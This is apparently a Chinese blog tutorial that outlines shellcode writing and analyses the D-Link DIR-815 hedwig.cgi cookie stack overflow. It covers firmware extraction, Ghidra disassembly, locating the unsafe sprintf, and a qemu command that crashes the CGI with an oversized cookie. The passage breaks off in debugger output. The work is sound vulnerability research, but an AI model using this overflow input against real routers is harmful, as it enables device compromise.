<h2 id="简单shellcode的编写思路"><a href="#简单shellcode的编写思路" class="headerlink" title="简单shellcode的编写思路"></a>简单shellcode的编写思路</h2><p>我这里记录下我平时写shellcode所用的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先用c语言完成所需的程序,然后利用gcc生成文件</span><br><span class="line">然后可以用objdump来进行反汇编,看一下是否会有坏指令,如果有就根据汇编文件自己修改一下,没有就直接用(想多</span><br><span class="line">根据反汇编代码来自己写一下汇编代码,然后根据需求修改到字节数大小满足,没有截断就结束:)</span><br><span class="line">然后objcopy一步到位</span><br></pre></td></tr></table></figure></p>
<h2 id="实例分析-D-LINK-DIR-815多次溢出"><a href="#实例分析-D-LINK-DIR-815多次溢出" class="headerlink" title="实例分析(D-LINK DIR-815多次溢出)"></a>实例分析(D-LINK DIR-815多次溢出)</h2><h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/33863</span><br></pre></td></tr></table></figure></p>
<p>虽然D-link官网只说明645版本会收到影响,但其实815,300,615也会有</p>
<h3 id="固件下载地址"><a href="#固件下载地址" class="headerlink" title="固件下载地址:"></a>固件下载地址:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们根据公布漏洞的题目可以看出bug是出在’hedwig.cgi’文件内,而漏洞的成因是因为cookie过长可以导致栈溢出</p>
<p>下载完成后进行固件的提取,这里我们直接用binwalk就可以直接提取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e DIR-815.bin</span><br></pre></td></tr></table></figure></p>
<p>然后进入 squashfs-root文件夹下就可以看到熟悉的内容了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR-815.bin.extracted/squashfs-root  ls</span><br><span class="line">bin  dev  etc  home  htdocs  lib  mnt  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure></p>
<p>这时我们直接使用find命令搜索hedwig.cgi的位置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &apos;hedwig.cgi&apos;</span><br><span class="line">./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure></p>
<p>这时我们看看该文件是什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR-815.bin.extracted/squashfs-root/htdocs/web  ls -l hedwig.cgi </span><br><span class="line">lrwxrwxrwx 1 nightrainy nightrainy 14 Nov  8 17:52 hedwig.cgi -&gt; /htdocs/cgibin</span><br></pre></td></tr></table></figure></p>
<p>可以看到这个文件是指向cgibin的符号链接,下面我们就对该文件进行反汇编分析,由于是cookie导致的溢出,那么我们就直接对cookie进行分析,我们可以通过查询字符串来定位函数位置,这里我使用的是ghidra,当然,IDA也是一样的效果<br>可以搜索到字符串的函数应该是sess_get_uid函数,反汇编代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                     **************************************************************</span><br><span class="line">                     *                          FUNCTION                          *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     undefined sess_get_uid()</span><br><span class="line">                       assume gp = 0x4346d0</span><br><span class="line">                       assume t9 = 0x407c98</span><br><span class="line">     undefined         v0:1           &lt;RETURN&gt;</span><br><span class="line"></span><br><span class="line">                     sess_get_uid                                    XREF[9]:     Entry Point(*), </span><br><span class="line">                                                                                  phpcgi_main:00405498(c), </span><br><span class="line">                                                                                  authentication:0040825c(c), </span><br><span class="line">                                                                                  sess_generate_captcha:0040861c(c</span><br><span class="line">                                                                                  sess_validate:004087b0(c), </span><br><span class="line">                                                                                  sess_logout:0040893c(c), </span><br><span class="line">                                                                                  hedwigcgi_main:00409648(c), </span><br><span class="line">                                                                                  pigwidgeoncgi_main:00409c44(c), </span><br><span class="line">                                                                                  0042c714(*)  </span><br><span class="line">00407c98 43 00 1c 3c     lui        gp,0x43</span><br><span class="line">     assume t9 = &lt;UNKNOWN&gt;</span><br><span class="line">     assume gp = &lt;UNKNOWN&gt;</span><br><span class="line">00407c9c c0 ff bd 27     addiu      sp,sp,-0x40</span><br><span class="line">00407ca0 d0 46 9c 27     addiu      gp,gp,0x46d0</span><br><span class="line">00407ca4 3c 00 bf af     sw         ra,local_4(sp)</span><br><span class="line">00407ca8 38 00 be af     sw         s8,local_8(sp)</span><br><span class="line">00407cac 34 00 b7 af     sw         s7,local_c(sp)</span><br><span class="line">00407cb0 30 00 b6 af     sw         s6,local_10(sp)</span><br><span class="line">00407cb4 2c 00 b5 af     sw         s5,local_14(sp)</span><br><span class="line">00407cb8 28 00 b4 af     sw         s4,local_18(sp)</span><br><span class="line">00407cbc 24 00 b3 af     sw         s3,local_1c(sp)</span><br><span class="line">00407cc0 20 00 b2 af     sw         s2,local_20(sp)</span><br><span class="line">00407cc4 1c 00 b1 af     sw         s1,local_24(sp)</span><br><span class="line">00407cc8 18 00 b0 af     sw         s0,local_28(sp)</span><br><span class="line">00407ccc 10 00 bc af     sw         gp=&gt;_gp,local_30(sp)</span><br><span class="line">00407cd0 f4 80 99 8f     lw         t9,-0x7f0c(gp)=&gt;-&gt;sobj_new                       = 0040f560</span><br><span class="line">00407cd4 00 00 00 00     nop</span><br><span class="line">00407cd8 09 f8 20 03     jalr       t9=&gt;sobj_new                                     undefined sobj_new()</span><br><span class="line">00407cdc 21 b0 80 00     _move      s6,a0</span><br><span class="line">00407ce0 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407ce4 00 00 00 00     nop</span><br><span class="line">00407ce8 f4 80 99 8f     lw         t9,-0x7f0c(gp)=&gt;-&gt;sobj_new                       = 0040f560</span><br><span class="line">00407cec 00 00 00 00     nop</span><br><span class="line">00407cf0 09 f8 20 03     jalr       t9=&gt;sobj_new                                     undefined sobj_new()</span><br><span class="line">00407cf4 21 90 40 00     _move      s2,v0</span><br><span class="line">00407cf8 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407cfc 42 00 04 3c     lui        a0,0x42</span><br><span class="line">00407d00 dc 82 99 8f     lw         t9,-0x7d24(gp)=&gt;-&gt;getenv                         = 004194b0</span><br><span class="line">00407d04 cc a5 84 24     addiu      a0=&gt;s_HTTP_COOKIE_0041a5cc,a0,-0x5a34            = &quot;HTTP_COOKIE&quot;</span><br><span class="line">00407d08 09 f8 20 03     jalr       t9=&gt;getenv                                       char * getenv(char * __name)</span><br><span class="line">00407d0c 21 98 40 00     _move      s3,v0</span><br><span class="line">00407d10 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407d14 72 00 40 12     beq        s2,zero,LAB_00407ee0</span><br><span class="line">00407d18 42 00 04 3c     _lui       a0,0x42</span><br><span class="line">00407d1c 70 00 60 12     beq        s3,zero,LAB_00407ee0</span><br><span class="line">00407d20 00 00 00 00     _nop</span><br><span class="line">00407d24 6e 00 40 10     beq        v0,zero,LAB_00407ee0</span><br><span class="line">00407d28 21 a0 40 00     _move      s4,v0</span><br><span class="line">00407d2c 21 88 00 00     clear      s1</span><br><span class="line">00407d30 3b 00 15 24     li         s5,0x3b</span><br><span class="line">00407d34 03 00 1e 24     li         s8,0x3</span><br><span class="line">00407d38 3b 00 00 10     b          LAB_00407e28</span><br><span class="line">00407d3c 20 00 17 24     _li        s7,0x20</span><br><span class="line">                     LAB_00407d40                                    XREF[1]:     00407e30(j)  </span><br><span class="line">00407d40 1b 00 22 12     beq        s1,v0,LAB_00407db0</span><br><span class="line">00407d44 02 00 22 2a     _slti      v0,s1,0x2</span><br><span class="line">00407d48 05 00 40 10     beq        v0,zero,LAB_00407d60</span><br><span class="line">00407d4c 00 00 00 00     _nop</span><br><span class="line">00407d50 0a 00 20 12     beq        s1,zero,LAB_00407d7c</span><br><span class="line">00407d54 00 00 00 00     _nop</span><br><span class="line">00407d58 33 00 00 10     b          LAB_00407e28</span><br><span class="line">00407d5c 01 00 94 26     _addiu     s4,s4,0x1</span><br><span class="line">                     LAB_00407d60                                    XREF[1]:     00407d48(j)  </span><br><span class="line">00407d60 02 00 02 24     li         v0,0x2</span><br><span class="line">00407d64 1d 00 22 12     beq        s1,v0,LAB_00407ddc</span><br><span class="line">00407d68 00 00 00 00     _nop</span><br><span class="line">00407d6c 2d 00 3e 16     bne        s1,s8,LAB_00407e24</span><br><span class="line">00407d70 42 00 05 3c     _lui       a1,0x42</span><br><span class="line">00407d74 24 00 00 10     b          LAB_00407e08</span><br><span class="line">00407d78 21 20 40 02     _move      a0,s2</span><br><span class="line">                     LAB_00407d7c                                    XREF[1]:     00407d50(j)  </span><br><span class="line">00407d7c 29 00 17 12     beq        s0,s7,LAB_00407e24</span><br><span class="line">00407d80 00 00 00 00     _nop</span><br><span class="line">00407d84 74 81 99 8f     lw         t9,-0x7e8c(gp)=&gt;-&gt;sobj_free                      = 0040e6b8</span><br><span class="line">00407d88 00 00 00 00     nop</span><br><span class="line">00407d8c 09 f8 20 03     jalr       t9=&gt;sobj_free                                    undefined sobj_free()</span><br><span class="line">00407d90 21 20 40 02     _move      a0,s2</span><br><span class="line">00407d94 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407d98 00 00 00 00     nop</span><br><span class="line">00407d9c 74 81 99 8f     lw         t9,-0x7e8c(gp)=&gt;-&gt;sobj_free                      = 0040e6b8</span><br><span class="line">00407da0 00 00 00 00     nop</span><br><span class="line">00407da4 09 f8 20 03     jalr       t9=&gt;sobj_free                                    undefined sobj_free()</span><br><span class="line">00407da8 21 20 60 02     _move      a0,s3</span><br><span class="line">00407dac 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">                     LAB_00407db0                                    XREF[1]:     00407d40(j)  </span><br><span class="line">00407db0 4e 00 15 12     beq        s0,s5,LAB_00407eec</span><br><span class="line">00407db4 3d 00 02 24     _li        v0,0x3d</span><br><span class="line">00407db8 1a 00 02 12     beq        s0,v0,LAB_00407e24</span><br><span class="line">00407dbc 02 00 11 24     _li        s1,0x2</span><br><span class="line">00407dc0 6c 82 99 8f     lw         t9,-0x7d94(gp)=&gt;-&gt;sobj_add_char                  = 0040eb08</span><br><span class="line">00407dc4 21 28 00 02     move       a1,s0</span><br><span class="line">00407dc8 09 f8 20 03     jalr       t9=&gt;sobj_add_char                                undefined sobj_add_char()</span><br><span class="line">00407dcc 21 20 40 02     _move      a0,s2</span><br><span class="line">00407dd0 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407dd4 13 00 00 10     b          LAB_00407e24</span><br><span class="line">00407dd8 01 00 11 24     _li        s1,0x1</span><br><span class="line">                     LAB_00407ddc                                    XREF[1]:     00407d64(j)  </span><br><span class="line">00407ddc 03 00 15 16     bne        s0,s5,LAB_00407dec</span><br><span class="line">00407de0 21 28 00 02     _move      a1,s0</span><br><span class="line">00407de4 0f 00 00 10     b          LAB_00407e24</span><br><span class="line">00407de8 03 00 11 24     _li        s1,0x3</span><br><span class="line">                     LAB_00407dec                                    XREF[1]:     00407ddc(j)  </span><br><span class="line">00407dec 6c 82 99 8f     lw         t9,-0x7d94(gp)=&gt;-&gt;sobj_add_char                  = 0040eb08</span><br><span class="line">00407df0 00 00 00 00     nop</span><br><span class="line">00407df4 09 f8 20 03     jalr       t9=&gt;sobj_add_char                                undefined sobj_add_char()</span><br><span class="line">00407df8 21 20 60 02     _move      a0,s3</span><br><span class="line">00407dfc 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407e00 09 00 00 10     b          LAB_00407e28</span><br><span class="line">00407e04 01 00 94 26     _addiu     s4,s4,0x1</span><br><span class="line">                     LAB_00407e08                                    XREF[1]:     00407d74(j)  </span><br><span class="line">00407e08 6c 81 99 8f     lw         t9,-0x7e94(gp)=&gt;-&gt;sobj_strcmp                    = 0040e4b0</span><br><span class="line">00407e0c 00 00 00 00     nop</span><br><span class="line">00407e10 09 f8 20 03     jalr       t9=&gt;sobj_strcmp                                  undefined sobj_strcmp()</span><br><span class="line">00407e14 d8 a5 a5 24     _addiu     a1=&gt;DAT_0041a5d8,a1,-0x5a28                      = 75h    u</span><br><span class="line">00407e18 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407e1c 08 00 40 10     beq        v0,zero,LAB_00407e40</span><br><span class="line">00407e20 21 88 00 00     _clear     s1</span><br><span class="line">                     LAB_00407e24                                    XREF[6]:     00407d6c(j), 00407d7c(j), </span><br><span class="line">                                                                                  00407db8(j), 00407dd4(j), </span><br><span class="line">                                                                                  00407de4(j), 00407eec(j)  </span><br><span class="line">00407e24 01 00 94 26     addiu      s4,s4,0x1</span><br><span class="line">                     LAB_00407e28                                    XREF[3]:     00407d38(j), 00407d58(j), </span><br><span class="line">                                                                                  00407e00(j)  </span><br><span class="line">00407e28 00 00 90 82     lb         s0,0x0(s4)</span><br><span class="line">00407e2c 00 00 00 00     nop</span><br><span class="line">00407e30 c3 ff 00 16     bne        s0,zero,LAB_00407d40</span><br><span class="line">00407e34 01 00 02 24     _li        v0,0x1</span><br><span class="line">00407e38 22 00 00 10     b          LAB_00407ec4</span><br><span class="line">00407e3c 42 00 05 3c     _lui       a1,0x42</span><br><span class="line">                     LAB_00407e40                                    XREF[2]:     00407e1c(j), 00407ed8(j)  </span><br><span class="line">00407e40 9c 82 99 8f     lw         t9,-0x7d64(gp)=&gt;-&gt;sobj_get_string                = 0040e1cc</span><br><span class="line">00407e44 21 20 60 02     move       a0,s3</span><br><span class="line">                     LAB_00407e48                                    XREF[1]:     00407ee4(j)  </span><br><span class="line">00407e48 09 f8 20 03     jalr       t9=&gt;getenv                                       undefined sobj_get_string()</span><br><span class="line">                                                                                     char * getenv(char * __name)</span><br><span class="line">00407e4c 00 00 00 00     _nop</span><br><span class="line">00407e50 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407e54 21 20 c0 02     move       a0,s6</span><br><span class="line">00407e58 78 80 99 8f     lw         t9,-0x7f88(gp)=&gt;-&gt;sobj_add_string                = 0040e8f0</span><br><span class="line">00407e5c 00 00 00 00     nop</span><br><span class="line">00407e60 09 f8 20 03     jalr       t9=&gt;sobj_add_string                              undefined sobj_add_string()</span><br><span class="line">00407e64 21 28 40 00     _move      a1,v0</span><br><span class="line">00407e68 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407e6c 06 00 40 12     beq        s2,zero,LAB_00407e88</span><br><span class="line">00407e70 00 00 00 00     _nop</span><br><span class="line">00407e74 0c 83 99 8f     lw         t9,-0x7cf4(gp)=&gt;-&gt;sobj_del                       = 0040e724</span><br><span class="line">00407e78 00 00 00 00     nop</span><br><span class="line">00407e7c 09 f8 20 03     jalr       t9=&gt;sobj_del                                     undefined sobj_del()</span><br><span class="line">00407e80 21 20 40 02     _move      a0,s2</span><br><span class="line">00407e84 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">                     LAB_00407e88                                    XREF[1]:     00407e6c(j)  </span><br><span class="line">00407e88 1a 00 60 12     beq        s3,zero,LAB_00407ef4</span><br><span class="line">00407e8c 21 20 60 02     _move      a0,s3</span><br><span class="line">00407e90 0c 83 99 8f     lw         t9,-0x7cf4(gp)=&gt;-&gt;sobj_del                       = 0040e724</span><br><span class="line">00407e94 3c 00 bf 8f     lw         ra,local_4(sp)</span><br><span class="line">00407e98 38 00 be 8f     lw         s8,local_8(sp)</span><br><span class="line">00407e9c 34 00 b7 8f     lw         s7,local_c(sp)</span><br><span class="line">00407ea0 30 00 b6 8f     lw         s6,local_10(sp)</span><br><span class="line">00407ea4 2c 00 b5 8f     lw         s5,local_14(sp)</span><br><span class="line">00407ea8 28 00 b4 8f     lw         s4,local_18(sp)</span><br><span class="line">00407eac 24 00 b3 8f     lw         s3,local_1c(sp)</span><br><span class="line">00407eb0 20 00 b2 8f     lw         s2,local_20(sp)</span><br><span class="line">00407eb4 1c 00 b1 8f     lw         s1,local_24(sp)</span><br><span class="line">00407eb8 18 00 b0 8f     lw         s0,local_28(sp)</span><br><span class="line">00407ebc 08 00 20 03     jr         t9=&gt;sobj_del</span><br><span class="line">00407ec0 40 00 bd 27     _addiu     sp,sp,0x40</span><br><span class="line">                     LAB_00407ec4                                    XREF[1]:     00407e38(j)  </span><br><span class="line">00407ec4 6c 81 99 8f     lw         t9,-0x7e94(gp)=&gt;-&gt;sobj_strcmp                    = 0040e4b0</span><br><span class="line">00407ec8 d8 a5 a5 24     addiu      a1=&gt;DAT_0041a5d8,a1,-0x5a28                      = 75h    u</span><br><span class="line">00407ecc 09 f8 20 03     jalr       t9=&gt;sobj_strcmp                                  undefined sobj_strcmp()</span><br><span class="line">00407ed0 21 20 40 02     _move      a0,s2</span><br><span class="line">00407ed4 10 00 bc 8f     lw         gp,local_30(sp)</span><br><span class="line">00407ed8 d9 ff 40 10     beq        v0,zero,LAB_00407e40</span><br><span class="line">00407edc 42 00 04 3c     _lui       a0,0x42</span><br><span class="line">                     LAB_00407ee0                                    XREF[3]:     00407d14(j), 00407d1c(j), </span><br><span class="line">                                                                                  00407d24(j)  </span><br><span class="line">00407ee0 dc 82 99 8f     lw         t9,-0x7d24(gp)=&gt;-&gt;getenv                         = 004194b0</span><br><span class="line">00407ee4 d8 ff 00 10     b          LAB_00407e48</span><br><span class="line">00407ee8 dc a5 84 24     _addiu     a0=&gt;s_REMOTE_ADDR_0041a5dc,a0,-0x5a24            = &quot;REMOTE_ADDR&quot;</span><br><span class="line">                     LAB_00407eec                                    XREF[1]:     00407db0(j)  </span><br><span class="line">00407eec cd ff 00 10     b          LAB_00407e24</span><br><span class="line">00407ef0 21 88 00 00     _clear     s1</span><br><span class="line">                     LAB_00407ef4                                    XREF[1]:     00407e88(j)  </span><br><span class="line">00407ef4 3c 00 bf 8f     lw         ra,local_4(sp)</span><br><span class="line">00407ef8 38 00 be 8f     lw         s8,local_8(sp)</span><br><span class="line">00407efc 34 00 b7 8f     lw         s7,local_c(sp)</span><br><span class="line">00407f00 30 00 b6 8f     lw         s6,local_10(sp)</span><br><span class="line">00407f04 2c 00 b5 8f     lw         s5,local_14(sp)</span><br><span class="line">00407f08 28 00 b4 8f     lw         s4,local_18(sp)</span><br><span class="line">00407f0c 24 00 b3 8f     lw         s3,local_1c(sp)</span><br><span class="line">00407f10 20 00 b2 8f     lw         s2,local_20(sp)</span><br><span class="line">00407f14 1c 00 b1 8f     lw         s1,local_24(sp)</span><br><span class="line">00407f18 18 00 b0 8f     lw         s0,local_28(sp)</span><br><span class="line">00407f1c 08 00 e0 03     jr         ra</span><br><span class="line">00407f20 40 00 bd 27     _addiu     sp,sp,0x40</span><br></pre></td></tr></table></figure></p>
<p>分析过程中并未发现漏洞出现在哪里,随即查看下哪些函数调用了这个函数,终于在hedwigcgi_main函数中发现了可能会导致栈溢出的危险函数sprintf,这部分的代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0040963c 42 00 02 3c     _lui       v0,0x42</span><br><span class="line">00409640 44 80 99 8f     lw         t9,-0x7fbc(gp)=&gt;-&gt;sess_get_uid                   = 00407c98</span><br><span class="line">00409644 00 00 00 00     nop</span><br><span class="line">00409648 09 f8 20 03     jalr       t9=&gt;sess_get_uid                                 undefined sess_get_uid()</span><br><span class="line">0040964c 21 20 a0 02     _move      a0,s5</span><br><span class="line">00409650 10 00 bc 8f     lw         gp,local_4d8(sp)</span><br><span class="line">00409654 00 00 00 00     nop</span><br><span class="line">00409658 9c 82 99 8f     lw         t9,-0x7d64(gp)=&gt;-&gt;sobj_get_string                = 0040e1cc</span><br><span class="line">0040965c 00 00 00 00     nop</span><br><span class="line">00409660 09 f8 20 03     jalr       t9=&gt;sobj_get_string                              undefined sobj_get_string()</span><br><span class="line">00409664 21 20 a0 02     _move      a0,s5</span><br><span class="line">00409668 10 00 bc 8f     lw         gp,local_4d8(sp)</span><br><span class="line">0040966c 42 00 05 3c     lui        a1,0x42</span><br><span class="line">00409670 d0 80 99 8f     lw         t9,-0x7f30(gp)=&gt;-&gt;sprintf                        = 004197f0</span><br><span class="line">00409674 21 38 40 00     move       a3,v0</span><br><span class="line">00409678 21 30 40 02     move       a2=&gt;s_/runtime/session_0041a5b8,s2               = &quot;/runtime/session&quot;</span><br><span class="line">0040967c 60 a8 a5 24     addiu      a1=&gt;s_%s/%s/postxml_0041a860,a1,-0x57a0          = &quot;%s/%s/postxml&quot;</span><br><span class="line">00409680 09 f8 20 03     jalr       t9=&gt;sprintf                                      int sprintf(char * __s, char * _</span><br></pre></td></tr></table></figure></p>
<p>推测可能就是因为sprintf函数导致最终的栈溢出,下面我们对猜测进行验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;A&apos;*0x600&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;0.0.0.0&quot; -g 23946 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure></p>
<p>然后我们还是用gdb attach上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:23946</span><br><span class="line">Remote debugging using localhost:23946</span><br><span class="line">0x767e9a00 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line"> V1   0x0</span><br><span class="line"> A0   0x0</span><br><span class="line"> A1   0x0</span><br><span class="line"> A2   0x0</span><br><span class="line"> A3   0x0</span><br><span class="line"> T0   0x0</span><br><span class="line"> T1   0x0</span><br><span class="line"> T2   0x0</span><br><span class="line"> T3   0x0</span><br><span class="line"> T4   0x0</span><br><span class="line"> T5   0x0</span><br><span class="line"> T6   0x0</span><br><span class="line"> T7   0x0</span><br><span class="line"> T8   0x0</span><br><span class="line"> T9   0x0</span><br><span class="line"> S0   0x0</span><br><span class="line"> S1   0x0</span><br><span class="line"> S2   0x0</span><br><span class="line"> S3   0x0</span><br><span class="line"> S4   0x0</span><br><span class="line"> S5   0x0</span><br><span class="line"> S6   0x0</span><br><span class="line"> S7   0x0</span><br><span class="line"> S8   0x0</span><br><span class="line"> FP   0x0</span><br><span class="line"> SP   0x76ffea50 ◂— 0x1</span><br><span class="line"> PC   0x767e9a00 ◂— move   $t9, $ra /* 0x3e0c821 */</span><br><span 